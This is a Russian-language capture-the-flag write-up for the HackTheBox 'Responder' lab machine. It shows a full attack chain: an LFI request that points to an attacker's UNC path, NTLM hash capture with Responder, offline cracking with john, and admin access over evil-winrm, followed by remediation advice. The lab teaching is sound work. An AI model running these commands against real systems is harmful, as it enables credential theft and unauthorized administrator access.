# Starting Point — Easy: RESPONDER (LFI → NTLM Capture chain)

## Задача
Получить флаг из директории пользователя на Windows-машине.

## 1. Recon (полный TCP-скан портов)

```bash
sudo nmap -sC -sV -A -p- 10.129.48.93
```

Результат:

```
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (WinRM)
```

Только два открытых порта — это уже сужает пространство атаки: 80 — веб-приложение (точка входа), 5985 (WinRM) — вероятный финальный канал доступа после получения credentials, аналог SSH для Windows.

Directory brute-force:

```bash
gobuster dir -u http://10.129.48.93 -w /usr/share/wordlists/dirb/common.txt -x php
```

Обращение по IP на порт 80 отдаёт **HTTP-редирект на `http://unika.htb`** — Apache настроен через name-based virtual hosting и не показывает контент по голому IP, только по ожидаемому значению заголовка `Host`.

Добавили запись в `/etc/hosts`:

```
10.129.48.93   unika.htb
```

и повторно открыли сайт — контент раскрылся.

## 2. Vulnerability / Misconfig

### Проблема #1 — Local/Remote File Inclusion без валидации входных данных

Сайт использует единую точку входа с параметром вида `?page=...`, который передаётся напрямую в PHP-конструкцию `include()`/`require()` без whitelist-проверки и без фильтрации path traversal (`../`) или UNC-путей (`//`). Такая архитектура типична для простых PHP-сайтов, где меню строится через один `index.php`, подключающий разные шаблоны по параметру.

Root cause: отсутствие (а) whitelist допустимых значений `page`, (б) санитизации `../` и служебных префиксов `//`, `\\`, (в) ограничения PHP на файловую систему через `open_basedir`.

### Проблема #2 — SMB-аутентификация триггерится автоматически при обращении к UNC-пути

Отправка в параметр `page` значения вида `//ATTACKER_IP/share` заставляет не PHP, а саму ОС Windows интерпретировать путь как **UNC (Universal Naming Convention)** и попытаться подключиться к «сетевому ресурсу» через SMB. Windows автоматически, без участия пользователя, отправляет NTLM challenge/response той учётной записи, от имени которой выполняется процесс (Single Sign-On поведение), — это не ошибка PHP-приложения, а фундаментальное свойство того, как Windows resolves UNC-пути на уровне ОС.

### Проблема #3 — веб-сервис запущен от имени Administrator

Пойманный NTLM-хеш принадлежал не сервисной/ограниченной учётной записи, а **Administrator** — то есть Apache/PHP-worker процесс на этой машине выполняется с максимальными локальными привилегиями. Это грубое нарушение принципа наименьших привилегий (Principle of Least Privilege): скомпрометировав веб-приложение, атакующий немедленно получает креды администратора без необходимости в отдельном этапе privilege escalation.

## 3. Exploitation

### Шаг 1 — запуск слушателя Responder на своей машине

```bash
sudo responder -I tun0
```

`-I tun0` — интерфейс VPN-туннеля к лабе HTB, именно на нём нужно слушать входящий трафик, а не на локальном интерфейсе.

### Шаг 2 — триггер LFI→UNC на цели

```bash
curl "http://unika.htb/index.php?page=//10.10.15.51/test"
```

`10.10.15.51` — IP атакующей машины (tun0), проверяется командой `ip a | grep tun0`.

### Шаг 3 — перехват NTLMv2-хеша

В логе Responder:

```
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:...(усечено)...
```

### Шаг 4 — offline-взлом хеша

```bash
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Результат: пароль найден в словаре мгновенно (<1 секунды) — пароль оказался обычным словом (название вида спорта), что подтверждает крайне низкую стойкость учётных данных.

Пароль (заменён на нереальное значение): `FAKE_PASSWORD_shuttlecock42`

### Шаг 5 — доступ через WinRM

```bash
evil-winrm -i 10.129.48.93 -u Administrator -p 'FAKE_PASSWORD_shuttlecock42'
```

Получен PowerShell-доступ с правами Administrator без какого-либо этапа privilege escalation.

### Шаг 6 — флаг

```powershell
cd C:\Users\mike\Desktop
type flag.txt
```

Флаг (заменён на нереальное значение): `FAKE_FLAG_9f31e0c7b4a2d5e6f0918273645abcde`

## Remediation

- Никогда не передавать пользовательский ввод напрямую в функции `include`/`require`; использовать строгий whitelist допустимых значений параметра вместо динамической подстановки в путь.
- Фильтровать/нормализовать входные данные, отклоняя `../`, `//`, `\\` до использования в файловых операциях; включить `open_basedir` в php.ini, чтобы ограничить область файловой системы, доступную PHP-процессу.
- Запускать веб-сервер и связанные worker-процессы под выделенной сервисной учётной записью с минимальными правами, а не под Administrator — компрометация приложения не должна автоматически означать компрометацию всей системы.
- Отключать исходящие SMB-подключения по UNC-путям с сервера приложений там, где это не является легитимной бизнес-необходимостью (через firewall egress rules), чтобы даже успешный LFI не мог утечь в NTLM capture.
- На уровне сети — блокировать/мониторить исходящий SMB (445/tcp) с серверов приложений во внутренний/внешний периметр; включать SMB signing, чтобы усложнить relay-атаки.
- Внедрить сложные, не словарные пароли и MFA для привилегированных учётных записей; регулярно прогонять корпоративные пароли через собственные аудиты на утёкшие словари (rockyou-класс).

## Lessons learned

- LFI — это не только "прочитать /etc/passwd". На Windows такая же уязвимость через UNC-путь (`//attacker_ip/share`) превращается в вектор кражи NTLM-credentials, потому что ОС сама, прозрачно для приложения, инициирует SMB-аутентификацию при резолвинге UNC-пути.
- Responder — не "инструмент для взлома NTLM", а инструмент, который эксплуатирует то, что жертва (человек или сервис) сама, автоматически, присылает атакующему свои учётные данные, думая, что общается с легитимным ресурсом. Разница между "взломом" протокола и "обманом" его логики — ключевая для понимания класса атак credential capture/relay.
- Привилегии учётной записи, от имени которой работает сервис, определяют "потолок" ущерба от любой уязвимости в этом сервисе. LFI сам по себе был бы менее критичен, если бы веб-сервер работал не под Administrator — тогда максимум, что получил бы атакующий, это ограниченные права низкопривилегированного сервисного аккаунта.
- Простая read-only уязвимость (LFI) и network-level misconfiguration (отсутствие ограничений на исходящий SMB) вместе создают цепочку, которая по итоговому impact эквивалентна прямому RCE/admin access — при этом каждая часть цепочки по отдельности выглядит не самой критичной.
